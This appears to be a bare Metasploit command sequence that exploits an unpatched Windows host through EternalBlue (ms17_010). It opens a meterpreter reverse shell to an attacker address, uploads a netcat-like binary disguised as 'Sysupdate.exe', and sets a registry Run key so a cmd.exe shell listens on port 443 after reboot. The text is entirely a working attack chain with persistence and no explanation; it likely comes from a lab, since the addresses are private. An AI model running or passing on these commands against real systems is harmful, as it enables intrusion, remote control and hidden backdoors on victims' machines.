#msfdb run
#msf6>
#use exploit/windows/smb/ms17_010_eternalblue
#sleep 2
#set rhosts 192.168.56.123
#set payload windows/x64/meterpreter/reverse_tcp
#set lhost 192.168.56.188
#sleep 2
#run
#meterpreter>
#upload /root/Desktop/590.exe C:\\Users\\erdong\\Desktop
#reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltset_nc -d 'C:\Users\erdong\Desktop\590.exe -Ldp 443 -e cmd.exe'
#reboot
upload /root/Desktop/Sysupdate.exe C:\\Windows
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltset_nc -d 'C:\Windows\Sysupdate.exe -Ldp 443 -e cmd.exe'